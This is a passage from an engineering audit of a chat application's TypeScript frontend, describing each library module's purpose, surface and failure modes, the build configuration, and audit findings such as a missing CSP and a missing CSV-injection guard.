`:508`, `:548`, `:583`) — the backend can never supply a format string or a function.

## lib/chartTheme.ts  (121 LOC)
**Purpose** — Resolves the chart palette from the design-system CSS custom properties, with literal
fallbacks for SSR and tests.

**Public surface** — `export interface ChartPalette {series; text; axis; grid; surface; tooltipBg; tooltipText}`
[`:24-33`](../../frontend/lib/chartTheme.ts#L24-L33); `export const SERIES_FALLBACK` `:35-41`
(5 hexes); `export type ThemeName = keyof typeof CHROME` `:62`;
`resolveSeriesColors(root?): string[]` `:87-103`; `resolvePalette(theme, root?): ChartPalette`
`:106-109`; `fallbackPalette(theme): ChartPalette` `:112-115`;
`seriesColor(palette, i): string` `:118-121`. Private `CHROME` `:43-60`, `TOKEN_NAMES` `:64-70`,
`isUsableColor` `:73-79`.

**Control flow** — `resolveSeriesColors` returns fallbacks with no DOM `:88-91`, wraps
`getComputedStyle` in try/catch `:93-98`, then maps each token through `isUsableColor` `:99-102`.

**State & side effects** — Reads `document.documentElement` + `window.getComputedStyle` `:89`,
`:95`. No writes.

**Dependencies** — Inbound: [`ChartView.tsx:29`](../../frontend/components/ChartView.tsx#L29),
`chartOption.ts:33`, `tests/chartOption.test.ts`. Outbound: none.

**Config** — None; reads the CSS vars `--ts-chart-1..5` defined at
[`globals.css:60-64`](../../frontend/app/globals.css#L60-L64).

**Failure modes** — Total; every path returns a palette.

**Concurrency** — Synchronous, pure apart from the computed-style read.

**Complexity hotspots** — None.

**Findings** — None. Drift risk: `CHROME` `:43-60` hard-codes 12 further colours that also exist as
tokens (`--ts-border`, `--ts-surface`, `--ts-text-muted`) and are **not** resolved from CSS.

## lib/chartFormat.ts  (138 LOC)
**Purpose** — Application-owned number/date/label formatting for charts. Nothing here can be
supplied by the backend — that is the point.

**Public surface** — `export type Cell = string | number | boolean | null | undefined`
[`:21`](../../frontend/lib/chartFormat.ts#L21); `isNumeric(v)` `:26`; `toNumber(v)` `:40`;
`formatInteger(v)` `:46`; `formatDecimal(v, places=2)` `:50`; `formatPercent(v, places=1)` `:57`;
`formatCompact(v)` `:65`; `formatNumber(v)` `:85`; `formatCurrency(v, currency?)` `:95`;
`formatDate(v)` `:108`; `formatDateTime(v)` `:117`; `formatCell(v)` `:125`;
`truncateLabel(label, max=24)` `:136`. Constants `COMPACT_THRESHOLD = 10_000` `:23`, `ISO_DATE`
`:105`, `ISO_DATETIME` `:106`.

**Control flow** — `formatCell` `:125-133` dispatches by JS type then by ISO-date regex;
`formatCompact` `:65-82` scales through a T/B/M/k table `:68-73`.

**State & side effects** — None. Pure. Uses the ambient locale via `toLocaleString` `:47`, `:51`,
`:99`, `:114`, `:121`.

**Dependencies** — Inbound: [`chartOption.ts:34-42`](../../frontend/lib/chartOption.ts#L34-L42)
only. Outbound: none.

**Config** — None.

**Failure modes** — `formatCurrency` `:95-103` guards a bad ISO code with a regex `:97` and wraps
`toLocaleString` in try/catch `:98-102`; `formatDate`/`formatDateTime` return the raw string when
parsing fails `:112-114`, `:121`. Nothing throws.

**Concurrency** — Synchronous, pure.

**Complexity hotspots** — None.

**Findings** — None. `formatPercent` `:57`, `formatCurrency` `:95` and `formatInteger` `:46` are
exported but imported by nothing (`chartOption.ts:34-42` imports only `Cell`, `formatCell`,
`formatCompact`, `formatNumber`, `isNumeric`, `toNumber`, `truncateLabel`) — dead code retained for
the documented "no backend-supplied format string" policy `:1-18`. `toLocaleString` with no explicit
locale makes output host-locale dependent, so the browser and the server-rendered report PNG can
disagree on thousands separators.

### 7.4 Feature helpers

## lib/conversationMenu.ts  (236 LOC)
**Purpose** — Headless, unit-testable model for the sidebar row menu: items, activation semantics,
keyboard map, popover placement.

**Public surface** — `ConversationMenuItemId`
[`:11-18`](../../frontend/lib/conversationMenu.ts#L11-L18); `ConversationMenuItem` `:20-25`;
`ConversationMenuFlags` `:27-30`;
`conversationMenuItems(flags, confirmingDelete = false): ConversationMenuItem[]` `:40-57`;
`ConversationMenuHandlers` `:59-65`; `ConversationMenuActions` `:68-75`;
`conversationMenuHandlers(conversation, actions)` `:82-95`; `ConversationMenuOutcome` `:98-104`;
`activateMenuItem(id, handlers): ConversationMenuOutcome` `:110-135`; `MenuKeyAction` `:137-143`;
`menuKeyAction(key, current, count)` `:150-172`; `MenuRect`/`MenuSize`/`MenuViewport`/`MenuPosition`
`:176-197`; `placeMenu(trigger, menu, viewport, gap = 6, margin = 8): MenuPosition` `:208-236`.

**Control flow** — `activateMenuItem` `:110-135` is an exhaustive switch where `'delete'` returns
`confirm-delete` **without** calling `onDelete` `:127-128`. `placeMenu` `:208-236` prefers below,
flips above when it would overflow, and clamps both axes `:215-234`.

**State & side effects** — None. Pure.

**Dependencies** — Inbound: [`Sidebar.tsx:17`](../../frontend/components/Sidebar.tsx#L17),
`ConversationMenu.tsx:36`, `tests/conversation-menu.test.ts`. Outbound: none.

**Config** — None.

**Failure modes** — `menuKeyAction` returns `{kind:'close'}` for Escape/Tab **before** the
`count === 0` guard `:155-156` — intended. Nothing throws.

**Concurrency** — Synchronous, pure.

**Complexity hotspots** — None.

**Findings** — None. This module is the architectural pattern the codebase should generalise:
behaviour is pure and tested, the component is a rendering shell.

## lib/searchPalette.ts  (379 LOC)
**Purpose** — Headless model for the search palette: wire parsing, date bucketing, row model,
snippets, keyboard maps, debounce, and the app-wide shortcut table.

**Public surface** — `SearchMatch` [`:18`](../../frontend/lib/searchPalette.ts#L18);
`SearchResult` `:21-31`; `parseSearchResults(body, fallbackTime = Date.now())` `:39-70`;
`resultsFromSummaries(conversations)` `:77-89`; `DateGroupLabel` `:93`; `DATE_GROUP_ORDER` `:96-101`;
`dateGroup(updatedAt, now = Date.now())` `:116-122`; `PaletteRow` `:126-128`; `PaletteSection`
`:130-134`; `PaletteModel` `:136-140`; `buildPaletteModel(results, now)` `:151-179`;
`rowSnippet(result)` `:186-188`; `SNIPPET_WIDTH = 120` `:193`;
`buildSnippet(content, query, width)` `:204-224`; `PaletteKeyAction` `:228-234`;
`paletteKeyAction(key, current, count)` `:243-260`; `trapFocusIndex(current, count, backwards)`
`:263-271`; `SEARCH_MAX_QUERY = 100` `:276`; `normalizeQuery(raw)` `:278-280`;
`SEARCH_DEBOUNCE_MS = 150` `:283`; `Debounced<Args>` `:285-288`;
`createDebounce<Args>(fn, delayMs)` `:295-315`; `ShortcutAction` `:319-324`; `ShortcutEvent`
`:326-331`; `ShortcutContext` `:333-339`; `shortcutAction(event, ctx)` `:353-379`.

**Control flow** — `parseSearchResults` `:39-70` accepts either `{results: […]}` or a bare array
`:43-47` and skips rows without a string `id` `:51-53`; `buildPaletteModel` `:151-179` buckets by
date then assigns indices in **render** order `:167-176`; `shortcutAction` `:353-379` handles the
modifier chords first `:361-367`, then Escape `:369-372`, then `/` `:374-376`.

**State & side effects** — `createDebounce` `:295-315` owns a `setTimeout` handle in a closure.
Nothing else.

**Dependencies** — Inbound:
[`SearchPalette.tsx:40-53`](../../frontend/components/SearchPalette.tsx#L40-L53),
`ChatApp.tsx:36`, `mockApi.ts:11`. Outbound: `./historyApi` `:12`, `./types` `:13`.

**Config** — None.

**Failure modes** — Every parse path degrades to `[]` rather than throwing `:43-47`, `:51-53`.
`createDebounce`'s timer is only cleared by an explicit `cancel()` `:307-314`, which the caller does
on unmount ([`SearchPalette.tsx:172-179`](../../frontend/components/SearchPalette.tsx#L172-L179)).

**Concurrency** — Synchronous, pure apart from the debounce timer.

**Complexity hotspots** — None > 60 LOC; `buildPaletteModel` is 29 LOC.

**Findings** — None. `dateGroup` `:116-122` rounds the day delta explicitly to survive 23/25-hour
DST days `:109-115` — a correctness detail worth preserving.

## lib/contextMeter.ts  (147 LOC)
**Purpose** — Pure maths for the context-usage ring and its breakdown popover.

**Public surface** — `latestUsage(messages): ContextUsage | null`
[`:24-30`](../../frontend/lib/contextMeter.ts#L24-L30);
`export type MeterState = 'calm'|'warn'|'high'|'critical'` `:32`; `WARN_AT = 0.6` `:34`;
`HIGH_AT = 0.85` `:35`; `PULSE_AT = 0.95` `:36`; `DEFAULT_RESERVED_OUTPUT = 8192` `:45`;
`DEFAULT_USABLE_BUDGET = 131072 - 8192 - 512` `:46`; `estimateDraftTokens(text)` `:49-51`;
`meterState(fraction)` `:53-59`; `meterColor(state)` `:62-72`; `meterPercent(fraction)` `:74-77`;
`export interface MeterView` `:79-87`; `meterView(usage, draft): MeterView` `:95-113`;
`buildBreakdown(usage, draftTokens)` `:120-138`; `breakdownTotal(rows)` `:141-147`.

**Control flow** — `latestUsage` `:25-29` scans messages backwards for the first `meta.context`.
`meterView` `:99-112`: `draftTokens` `:99` → `usable = usage?.usable_budget || DEFAULT` `:100`
(note `||`, not `??`, so a server-reported `0` falls back) → `used = tokens_used + draftTokens`
`:101` → `fraction` guarded against `usable <= 0` `:102`. `buildBreakdown` `:125-137` emits three
rows, marks "Reserved for reply" `heldBack: true` `:134`, and filters `tokens > 0` `:137`;
`breakdownTotal` `:145-146` sums only non-`heldBack` rows.

**State & side effects** — None. Pure.

**Dependencies** — Inbound: `ChatApp.tsx`, `ContextMeter.tsx`, `tests/contextMeter.test.ts`.
Outbound: `./types` `:14`.

**Config** — None read at runtime, but the three constants at `:45-46` **duplicate server
configuration**: `8192` matches `MODEL_MAX_OUTPUT`
([`orchestrator/app/config.py:128`](../../orchestrator/app/config.py#L128)), `512` matches
`CONTEXT_SAFETY_MARGIN` ([`config.py:131`](../../orchestrator/app/config.py#L131)), and `131072`
matches the main model window ([`orchestrator/app/context.py:4`](../../orchestrator/app/context.py#L4)).
Consistent today, but all three are environment-overridable server values hard-coded in the browser,
and no endpoint exposes the server's real budget for the first request.

**Failure modes** — Nothing raises. `meterState` `:54` and `meterPercent` `:75` both guard
`!Number.isFinite`; `estimateDraftTokens` guards falsy text `:50`.

**Concurrency** — Pure/synchronous.

**Complexity hotspots** — None; the largest function is `meterView` at 19 LOC.

**Findings** — None assigned. The comment at `:129-136` documents a **shipped bug that was fixed**:
the reserved-output row used to be summed in, making the popover read 16,747 while the ring read 3%.

## lib/errors.ts  (104 LOC)
**Purpose** — Turn a raw engine/model error string into a plain-language sentence plus a disclosure
carrying the original.

**Public surface** — `trimNotice(info: {dropped_turns: number; clipped_messages: number}): string`
[`:19-38`](../../frontend/lib/errors.ts#L19-L38);
`export interface FriendlyError {message: string; detail: string | null}` `:40-45`;
`extractUpstreamMessage(raw): string | null` `:48-54`;
`friendlyError(raw?): FriendlyError` `:61-104`. Private regexes `CONTEXT_OVERFLOW` `:56`,
`CONNECTION` `:57`, `OUT_OF_MEMORY` `:58`, `NOT_FOUND_MODEL` `:59`.

**Control flow** — `friendlyError` `:61-104`: empty input → generic `:62-65`;
`upstream = extractUpstreamMessage(text) ?? text` `:66`; then four ordered regex branches
`:68-95`; fallback `:99-103` shows the isolated sentence and keeps the full payload as `detail`.
`extractUpstreamMessage` `:48-54` runs two alternative regexes for double-quoted `:51` then
single-quoted `:52` `"message": "..."`, then unescapes `\\(.)` `:53` — handling both JSON and
Python-repr dicts.

**State & side effects** — None. Pure.

**Dependencies** — Inbound: [`MessageRow.tsx:18`](../../frontend/components/MessageRow.tsx#L18),
`tests/errors.test.ts`. Outbound: none.

**Config** — None.

**Failure modes** — Nothing raises, but there are **three classification bugs**:
`NOT_FOUND_MODEL` `:59` has a bare `not found` as its second alternation arm, so every orchestrator
`"conversation not found"` ([`main.py:344`](../../orchestrator/app/main.py#L344), `:760`;
`uploads.py:78`; `history.py:77`) and `"report not found"` ([`main.py:269`](../../orchestrator/app/main.py#L269))
is mislabelled *"The selected model is not available on this machine right now."* `CONNECTION` `:57`
matches a bare `timeout`, so a DuckDB or Salesforce query timeout is reported as *"The model server
did not respond."* Ordering matters: `CONTEXT_OVERFLOW` is tested first, so a "context length"
substring inside a connection error wins.

**Concurrency** — Pure/synchronous.

**Complexity hotspots** — `friendlyError` `:61-104` = 44 LOC, 6 branches — under threshold.

**Findings** — None assigned. The `CONTEXT_OVERFLOW` copy at `:71-72` tells the user to *"Switch the
model picker to Smart"*, but [`types.ts:11-14`](../../frontend/lib/types.ts#L11-L14) records that the
picker no longer chooses a model — it chooses effort, and there is only one model. Stale,
unactionable user-facing advice.

## lib/exportMarkdown.ts  (112 LOC)
**Purpose** — Builds (and downloads) a conversation as a Markdown file entirely in the browser.

**Public surface** — `slugifyTitle(title)` [`:21-30`](../../frontend/lib/exportMarkdown.ts#L21-L30);
`exportFilename(title, id)` `:33-35`; `buildConversationMarkdown(conversation)` `:70-74`;
`export interface ExportedConversation {filename; markdown}` `:76-79`;
`buildConversationExport(conversation)` `:81-88`;
`downloadMarkdown({filename, markdown})` `:95-112`. Private `ASSISTANT_LABEL = 'TechSara'` `:17`,
`SLUG_MAX = 48` `:18`, `messageSection(message)` `:37-64`.

**Control flow** — `messageSection` `:37-64` emits `## You` / `## TechSara` `:38-40`, the content or
a stopped/error placeholder `:42-49`, then for assistant turns a fenced ```` ```sql ```` block
`:52-53` and a `**Records:**` line `:55-60`; `buildConversationMarkdown` joins them under an H1
`:71-73`.

**State & side effects** — `downloadMarkdown` `:95-112`: Blob, object URL, anchor click, **deferred**
revoke `:111`. No network.

**Dependencies** — Inbound: [`ChatApp.tsx:25`](../../frontend/components/ChatApp.tsx#L25),
`history.ts:35-38`, `tests/export-markdown.test.ts`. Outbound: `./types` `:14`.

**Config** — None.

**Failure modes** — Nothing thrown. The export deliberately omits attachments, charts, reasoning,
steps, research and web sources — only content, SQL and record ids survive `:37-64`.

**Concurrency** — Synchronous.

**Complexity hotspots** — None.

**Findings** — None. The builder/downloader split `:90-94` is documented as a testability decision
and is the correct shape.

## lib/csv.ts  (39 LOC)
**Purpose** — Client-side CSV construction and download for the proof-drawer Data section.

**Public surface** — `rowsToCsv(rows: DataRow[]): string`
[`:12-25`](../../frontend/lib/csv.ts#L12-L25);
`downloadCsv(rows: DataRow[], filename: string): void` `:27-39`. Private
`escapeCell(value: unknown): string` `:5-10`.

**Control flow** — `rowsToCsv` unions all keys `:14-19`, emits a header then one CRLF-separated line
per row `:20-24`; `downloadCsv` creates a Blob `:28-30`, an object URL `:31`, a synthetic anchor
`:32-36`, and revokes **immediately** `:38`.

**State & side effects** — DOM mutation (`document.body.appendChild` `:35`), object URL
create/revoke `:31`/`:38`, browser download.

**Dependencies** — Inbound: [`DataTable.tsx:10`](../../frontend/components/DataTable.tsx#L10).
Outbound: `./types` `:3`.

**Config** — None.

**Failure modes** — `URL.revokeObjectURL(url)` is called **synchronously** right after `a.click()`
`:37-38`; [`exportMarkdown.ts:110-111`](../../frontend/lib/exportMarkdown.ts#L110-L111) and
[`MermaidBlock.tsx:184`](../../frontend/components/MermaidBlock.tsx#L184) both defer the revoke
precisely because an immediate revoke can abort the download in some browsers — this file is the
inconsistent one. **No CSV-injection guard**: a cell beginning `=`, `+`, `-` or `@` is written
verbatim `:5-10` and evaluates as a formula in Excel.

**Concurrency** — Synchronous.

**Complexity hotspots** — None.

**Findings** — None assigned (see §3 for the formula-injection note). `escapeCell`
`JSON.stringify`s objects `:8`, so a nested Salesforce record becomes a quoted JSON blob in the cell.

## lib/mermaid.ts  (123 LOC)
**Purpose** — Pure Mermaid helpers (language detection, streaming-safe "is it renderable yet",
filename slug, zoom maths, SVG export prep) kept free of the heavy `mermaid` import.

**Public surface** — `isMermaidLanguage(language?)` [`:9-11`](../../frontend/lib/mermaid.ts#L9-L11);
`looksRenderable(code)` `:26-34`; `diagramFileName(code, ext='png')` `:37-50`; `ZOOM_MIN = 0.1`
`:54`; `ZOOM_MAX = 4` `:55`; `clampZoom(z)` `:57-60`; `svgNaturalSize(svg)` `:63-71`;
`fitZoom(natural, viewportWidth, viewportHeight)` `:78-89`;
`prepareSvgForExport(svg, width, height, background)` `:96-123`. Private `MERMAID_LANGS` `:7`,
`DIAGRAM_HEADS` (23 entries) `:19-24`.

**Control flow** — `looksRenderable` requires ≥2 non-comment lines and a known head keyword `:27-33`
(this is what stops a half-streamed fence from rendering as an error);
`prepareSvgForExport` injects `xmlns` `:103-105`, rewrites width/height `:107-115`, and splices a
background `<rect>` after the first `>` `:117-121`.

**State & side effects** — None. Pure string manipulation.

**Dependencies** — Inbound:
[`MermaidBlock.tsx:20-29`](../../frontend/components/MermaidBlock.tsx#L20-L29),
`Markdown.tsx:11`, `tests/mermaid.test.ts`. Outbound: none.

**Config** — None.

**Failure modes** — `prepareSvgForExport` `:107-109` replaces the **first** `width=`/`height=`
occurrence in the whole string; if mermaid ever emits an SVG whose root lacks a width but whose
first child has one, the child's geometry is clobbered. `:117-121` splices at the first `>`,
assuming it closes the `<svg>` tag (mermaid escapes attribute `>`, so unreachable today).
`svgNaturalSize` `:66` returns `null` on an unexpected viewBox format and the caller silently falls
back to an unsized wrapper
([`MermaidBlock.tsx:409-415`](../../frontend/components/MermaidBlock.tsx#L409-L415)).

**Concurrency** — Synchronous, pure.

**Complexity hotspots** — None.

**Findings** — None.

## lib/pasted.ts  (65 LOC)
**Purpose** — The rules for turning a long paste into a "PASTED" chip and folding chips back into
the model input.

**Public surface** — `PASTE_MIN_CHARS = 1200` [`:16`](../../frontend/lib/pasted.ts#L16);
`PASTE_MIN_LINES = 12` `:17`; `countLines(text)` `:19-22`; `shouldAttachPaste(text)` `:25-28`;
`makePastedText(content, id)` `:30-32`; `foldModelContent(content, pasted?)` `:40-48`;
`imageExtFromMime(mime)` `:51-65`.

**Control flow** — `foldModelContent` `:40-48` places pasted blocks first, then the typed
instruction, dropping blank parts `:44-46`. This is what `streams.ts:318` sends as `content`, so the
model sees the pasted text inline while the UI keeps it collapsed.

**State & side effects** — None. Pure.

**Dependencies** — Inbound: [`streams.ts:22`](../../frontend/lib/streams.ts#L22),
`Composer.tsx:24-28`, `tests/pasted.test.ts`. Outbound: `./types` `:13`.

**Config** — None.

**Failure modes** — None.

**Concurrency** — Synchronous, pure.

**Complexity hotspots** — None.

**Findings** — `SEC-05` (indirect): `foldModelContent` is the mechanism by which arbitrary pasted
text is inlined into the prompt with no provenance marker or instruction-stripping.

## lib/format.ts  (46 LOC)
**Purpose** — Small shared formatters: byte sizes, timestamps, file-kind badges.

**Public surface** — `formatBytes(bytes?: number): string`
[`:3-15`](../../frontend/lib/format.ts#L3-L15); `formatWhen(input: number | string): string`
`:17-30`; `fileKind(nameOrType: string): {label; className}` `:40-46`. Private `FILE_KIND` `:32-38`.

**Control flow** — `formatBytes` walks a KB/MB/GB ladder `:6-14`; `formatWhen` tolerates unix
seconds `:20`; `fileKind` maps the last dot-segment through a table with a `FILE` fallback `:44-45`.

**State & side effects** — None.

**Dependencies** — Inbound: [`FileCards.tsx:7`](../../frontend/components/FileCards.tsx#L7) only.
Outbound: none.

**Config** — None.

**Failure modes** — `formatBytes(NaN)` returns an em dash `:4`; `formatWhen` returns the raw input
on an unparseable date `:22`.

**Concurrency** — Synchronous, pure.

**Complexity hotspots** — None.

**Findings** — None. `formatWhen` `:17` is exported but imported by nothing — dead code. The class
names `fileKind` returns are defined at
[`globals.css:443-462`](../../frontend/app/globals.css#L443-L462).

## lib/types.ts  (262 LOC)
**Purpose** — The shared type surface and the frontend's declaration of the `meta` contract.
Declaration-only; zero runtime output.

**Public surface** — `Engine` [`:8`](../../frontend/lib/types.ts#L8); `ModelChoice` `:15`;
`ReasoningEffort` `:22`; `ChatMode` `:25`; `AgentStep` `:28-33`; `ChartType` `:39-48`; `ChartSpec`
`:56-66`; `Citation` `:68-72`; `ReportFile` `:74-78`; `DataRow` `:80`; `PastedText` `:87-92`;
**`Meta` `:101-152`**; `ContextUsage` `:154-167`; `CodeSource` `:170-175`; `WebSource` `:178-183`;
`ResearchResult` `:186-190`; `ResearchQuery` `:193-196`; `Research` `:203-213`; `MessageStatus`
`:215`; `ChatMessage` `:217-240`; `Conversation` `:242-252`; `ConversationSummary` `:254-262`.

**Control flow** — None. Every declaration is erased at compile time; the module emits no
JavaScript.

**State & side effects** — None, and none possible — there is no emitted code to run.

**Dependencies** — Inbound: 37 modules (17 components, 10 tests, 10 libs) per
`rg -ln "from '@/lib/types'|from './types'"`. Outbound: none.

**Config** — None.

**Failure modes** — None at runtime. **The risk is that these are compile-time-only assertions**:
[`sse.ts:203`](../../frontend/lib/sse.ts#L203) casts the parsed `meta` straight to `Meta` with no
runtime check, so every field declared here is an unverified assumption about the wire.

**Concurrency** — n/a.

**Complexity hotspots** — n/a.

**Findings** — None assigned. Four contract divergences originate here and are detailed in
[frontend-api-contracts.md §5](./frontend-api-contracts.md): `Engine` `:8` omits `'dataset'`, which
[`orchestrator/app/engines/dataset.py:101`](../../orchestrator/app/engines/dataset.py#L101) emits;
`Meta` `:101-152` has no `auto` key despite
[`main.py:378-379`](../../orchestrator/app/main.py#L378-L379) setting one; `Meta` has no `datasets`
key despite
[`dataset.py:119-127`](../../orchestrator/app/engines/dataset.py#L119-L127) emitting one; and
`ReportFile` `:74-78` uses a third field naming, matching neither the orchestrator's `/reports`
listing nor `MOCK_REPORTS`.

### 7.5 Mock-mode modules

## lib/fixtures.ts  (397 LOC)
**Purpose** — `MOCK_MODE` canned SSE responses, one per engine, matching the real `meta` contract.

**Public surface** — `export interface Fixture {text; meta: Meta; reasoning?; steps?}`
[`:14-21`](../../frontend/lib/fixtures.ts#L14-L21); `MOCK_MODEL_IDS` `:24-27`;
`export const FIXTURES: Record<Engine, Fixture>` `:333-343`;
`pickFixtureEngine(lastUserMessage, hasImage, options?): Engine` `:351-375`; `MOCK_REPORTS`
`:378-397`. Nine module-local fixtures `:36`–`:315`.

**Control flow** — `pickFixtureEngine` `:351-375` is a fixed precedence chain: agent → assistant mode
→ image → greeting regex `:361-366` → report regex `:368` → rag regex `:371` → sql default `:374`.

**State & side effects** — None. Pure data.

**Dependencies** — Inbound: [`app/api/chat/route.ts:12`](../../frontend/app/api/chat/route.ts#L12)
and [`app/api/reports/route.ts:6`](../../frontend/app/api/reports/route.ts#L6) — **server routes
only**. Outbound: `./types` `:12`.

**Config** — None directly; only reachable when `MOCK_MODE=true`.

**Failure modes** — None. The literals are **not** `Object.freeze`d, so a route handler that mutated
`FIXTURES[...].meta` would corrupt the module for the Node process lifetime;
[`app/api/chat/route.ts:53-59`](../../frontend/app/api/chat/route.ts#L53-L59) spreads rather than
mutates.

**Concurrency** — n/a.

**Complexity hotspots** — None; the file is ~90% string literals.

**Findings** — `DX-02`. `MOCK_MODEL_IDS` `:24-27` names `openai/gpt-oss-120b` and
`Qwen/Qwen3-4B-Instruct-2507`, contradicting the current single-model story in
[`ModelPicker.tsx:6`](../../frontend/components/ModelPicker.tsx#L6) and
[`types.ts:11-15`](../../frontend/lib/types.ts#L11-L15) — stale fixture metadata that would be
served as if real.

## lib/mockApi.ts  (291 LOC)
**Purpose** — A server-only, in-memory implementation of the orchestrator's `/auth` and `/history`
contracts for `MOCK_MODE`.

**Public surface** — `export async function handleMockAuth(req, path): Promise<Response>`
[`:50-58`](../../frontend/lib/mockApi.ts#L50-L58);
`export async function handleMockHistory(req, path): Promise<Response>` `:151-291`. Private
`MockMessage` `:13-17`, `MockConversation` `:19-28`, `convsByUser` `:30`, `MOCK_LOCAL_USER = 'local'`
`:33`, `json()` `:35-42`, `nowIso()` `:62-64`, `PATCHABLE` `:67`, `summaryOf()` `:69-78`,
`userConvs()` `:80-87`, `MockSearchResult` `:90-98`, `SEARCH_LIMIT_DEFAULT = 50` `:100`,
`SEARCH_LIMIT_MAX = 100` `:101`, `mockSearch()` `:109-149`.

**Control flow** — `handleMockHistory` `:151-291` routes by path and verb: `search` `:157-159`,
list `:167-187`, create `:190-219`, append message `:225-243`, get `:246-253`, PUT patch `:255-282`,
DELETE `:283-287`, else 404 `:290`.

**State & side effects** — **Module-level mutable `Map convsByUser`** `:30`, persisting for the Node
process lifetime. No DB, no filesystem, no network.

**Dependencies** — Inbound:
[`app/api/history/[...path]/route.ts:9`](../../frontend/app/api/history/%5B...path%5D/route.ts#L9)
(`handleMockHistory` only). `handleMockAuth` `:50` is exported but **imported nowhere** — dead code.
Outbound: `./searchPalette` `:11` (`buildSnippet`, `SEARCH_MAX_QUERY`).

**Config** — None directly; gated by `MOCK_MODE` in the route handler.

**Failure modes** — Every JSON parse is wrapped `:192-196`, `:228-232`, `:258-262`; unknown PUT
fields are rejected `:263-268`, mirroring the server's `extra='forbid'`. The search path is a plain
JS substring match, so `%`/`_` need no escaping `:106-108`.

**Concurrency** — The Map is mutated from concurrent request handlers with no locking `:236-241`,
`:269-280`, `:285`. Node's single-threaded loop makes each synchronous block atomic, but a handler
that `await req.json()` then mutates `:227-241` interleaves with others.

**Complexity hotspots** — `handleMockHistory` `:151-291` = **141 LOC** with 8 route arms.

**Findings** — `DX-02`. It imports a **client-side** module (`./searchPalette`) into a server-only
file `:11`, coupling the mock backend to the palette's snippet rule — documented as intentional at
[`searchPalette.ts:200-203`](../../frontend/lib/searchPalette.ts#L200-L203).

---

## 8. `ORCHESTRATOR_URL` containment — verified

The orchestrator base URL is **never exposed to the browser bundle**. `rg -n "ORCHESTRATOR_URL"` over
`frontend/` returns hits only in modules that declare `export const runtime = 'nodejs'` or are
server-only helpers:

[`api/auth/me/route.ts:15`](../../frontend/app/api/auth/me/route.ts#L15) ·
[`api/chat/route.ts:139`](../../frontend/app/api/chat/route.ts#L139) ·
[`api/chat/active/route.ts:15`](../../frontend/app/api/chat/active/route.ts#L15) ·
[`api/chat/attach/[id]/route.ts:40`](../../frontend/app/api/chat/attach/%5Bid%5D/route.ts#L40) ·
[`api/chat/compact/route.ts:14`](../../frontend/app/api/chat/compact/route.ts#L14) ·
[`api/chat/stop/route.ts:15`](../../frontend/app/api/chat/stop/route.ts#L15) ·
[`api/reports/[filename]/route.ts:42`](../../frontend/app/api/reports/%5Bfilename%5D/route.ts#L42) ·
[`api/upload/route.ts:18`](../../frontend/app/api/upload/route.ts#L18) ·
[`lib/proxy.ts:10`](../../frontend/lib/proxy.ts#L10) · plus `frontend/README.md:29`.

There is **no `NEXT_PUBLIC_ORCHESTRATOR_URL`**. The only `NEXT_PUBLIC_*` variable anywhere is
`NEXT_PUBLIC_APP_NAME` (branding). The browser talks exclusively to same-origin `/api/*`. This is
correct and should be preserved.

---

## 9. Config and build files

| File | LOC | What it establishes |
|---|---:|---|
| [`tsconfig.json`](../../frontend/tsconfig.json) | 27 | `strict: true` `:7`; no `noUncheckedIndexedAccess`/`exactOptionalPropertyTypes`; `skipLibCheck: true` `:6`; alias `@/* → ./*` `:21-23`; `incremental: true` `:15` writes a 187 KB `tsconfig.tsbuildinfo` that `.dockerignore` does not exclude |
| [`tailwind.config.ts`](../../frontend/tailwind.config.ts) | 70 | `darkMode: 'class'` `:10`; every colour a `var()` `:19-39`; `maxWidth.thread = 768px` `:59-61`; `width.sidebar = 260px` `:62-64`; `plugins: []` `:67` |
| [`app/globals.css`](../../frontend/app/globals.css) | 530 | the whole token system `:13-111`; bespoke animation classes `:162-253`; markdown block `:305-411`; SQL token colours `:423-439`; a correct `prefers-reduced-motion` block `:466-494` |
| [`next.config.mjs`](../../frontend/next.config.mjs) | 8 | `output: 'standalone'` `:3`, `reactStrictMode: true` `:4`, `poweredByHeader: false` `:5`. **No `headers()`** ⇒ no CSP, no `X-Frame-Options`, no `Referrer-Policy`, no `X-Content-Type-Options`, no `Permissions-Policy`. No `middleware.ts` exists either |
| [`vitest.config.mts`](../../frontend/vitest.config.mts) | 8 | `include: ['tests/**/*.test.ts']` `:5`, `environment: 'node'` `:6` — components are structurally untestable |
| [`.eslintrc.json`](../../frontend/.eslintrc.json) | 3 | legacy `.eslintrc` format extending `next/core-web-vitals` + `next/typescript`; no custom rules, no `no-console`, `react-hooks/exhaustive-deps` left at its default severity |
| [`package.json`](../../frontend/package.json) | 36 | `next ^15.5.0`, `react ^19.1.0`, `echarts ^5.6.0`, `mermaid ^11.16.0`, `react-markdown ^10.1.0`, `remark-gfm ^4.0.1`; dev `eslint ^8.57.1` (EOL line), `tailwindcss ^3.4.17`, `typescript ^5.6.3`, `vitest ^3.2.0`. **No `typecheck` script** |
| `package-lock.json` | — | present and committed — resolved `next@15.5.21`, `react-dom@19.2.8`, `react-markdown@10.1.0`, `mermaid@11.16.0`, `dompurify@3.4.12`, `echarts@5.6.0` |
| [`Dockerfile`](../../frontend/Dockerfile) | 30 | three-stage `node:20-alpine` build → `.next/standalone`; runs as non-root `nextjs` `:24`/`:28`; `HOSTNAME=0.0.0.0` `:23`; **no `HEALTHCHECK`**; `NEXT_PUBLIC_APP_NAME` never passed as a build `ARG` `:9-15` |
| [`.dockerignore`](../../frontend/.dockerignore) | 8 | excludes `node_modules`, `.next`, `.git`, `tests`, `*.md` — but **not** `.env*` or `tsconfig.tsbuildinfo`. No `frontend/.env*` exists today |
| [`postcss.config.mjs`](../../frontend/postcss.config.mjs) | 9 | `tailwindcss` + `autoprefixer`; no `cssnano` (Next.js minifies CSS itself) |

**Findings for this section** — `TEST-01` (no CI anywhere in the repo — no `.github/`, no
`.gitlab-ci.yml`, no Jenkinsfile — so `npm run lint`, `npm test` and `next build` are never enforced
on a change), `TEST-02` (see `vitest.config.mts`), `DX-01` (**the frontend is the positive
counter-example**: `package-lock.json` is committed and the lockfile pins exact versions, unlike
`orchestrator/requirements.txt`), `SEC-05` (`next.config.mjs` — the missing CSP).

---

## 10. Findings index

| ID | Where in the frontend | Nature |
|---|---|---|
